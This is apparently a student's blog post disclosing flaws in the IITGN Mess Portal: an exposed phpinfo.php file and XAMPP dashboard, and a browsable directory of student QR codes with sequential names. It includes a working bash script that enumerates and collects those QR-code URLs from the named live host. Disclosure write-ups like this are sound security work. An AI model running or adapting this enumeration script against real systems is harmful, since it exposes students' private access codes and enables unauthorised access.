---
layout: ../../layouts/post.astro
title: 'Mess Portal Security Vulnerability'
author: Naveen Pal
description: 'A collaborative case study on identifying and reporting security vulnerabilities in the IITGN Mess Portal to ensure student data privacy.'
image:
    url: "/post/mess-qr-thumbnail.png"
    alt: "I know your Mess QR - Security Disclosure"
pubDate: 2026-04-20
tags: ["Cybersecurity", "Responsible Disclosure", "Web Security", "IITGN"]
---

I conducted a brief security assessment of the **IITGN Mess Portal**. During this process, I identified a few configuration oversights that could potentially expose sensitive server information and student data. 

Following the principles of **Responsible Disclosure**, I reported these findings to the relevant authorities to help strengthen the platform's security posture.

## Identified Vulnerabilities

### 1. Information Disclosure via System Files

The portal was found to have certain administrative files and dashboards publicly accessible. Specifically:
- **`phpinfo.php`**: This file revealed detailed information about the server's backend technology, PHP version, and configuration modules.
- **XAMPP Dashboard**: The default XAMPP dashboard was active, which often reveals internal server paths and environment details.

**Risk:** While not directly exploitable for data theft, this information significantly lowers the bar for an attacker to craft specialized exploits targeting specific software versions.

### 2. Public Access to Student QR Codes

A more significant finding was the open access to the `/phpscripts/qrcodes/` directory. Student QR codes, which are used for mess access, were stored using a predictable naming convention (`ORD_[ID].png`).

**Risk:** Because the directory was browsable and the filenames were sequential, a simple script could enumerate and download the QR codes for the entire student body.

## Proof of Concept (PoC)

To demonstrate the feasibility of a brute-force approach, I developed a simple bash script that checks for the existence of QR codes across a range of IDs in parallel.

```bash
#!/bin/bash

# Define the base URL
base_url="http://mess.iitgn.ac.in/phpscripts/qrcodes/ORD_"

# Define the range of numbers to check
start=2231920000
end=7231920800

# Define the output file
output_file="valid_urls.txt"
> "$output_file"

check_url() {
  local url="$1"
  local status_code=$(curl -o /dev/null -s -w "%{http_code}\n" "$url")
  if [ "$status_code" -eq 200 ]; then
    echo "Valid URL found: $url"
    echo "$url" >> "$output_file"
  fi
}

export -f check_url
export base_url output_file

# Processing URLs in parallel for efficiency
seq "$start" "$end" | xargs -I{} -P 8 bash -c 'check_url "${base_url}{}.png"'

echo "Assessment complete. Valid URLs saved to $output_file"
```
**Output:**
![QR Code PoC Output](/post/mess-scriptOutput.png)

I am happy to support the IITGN technical team in verifying the fixes and ensuring a more secure experience for everyone on campus.
![mail](/post/mess-mail.png)


Happy Hacking!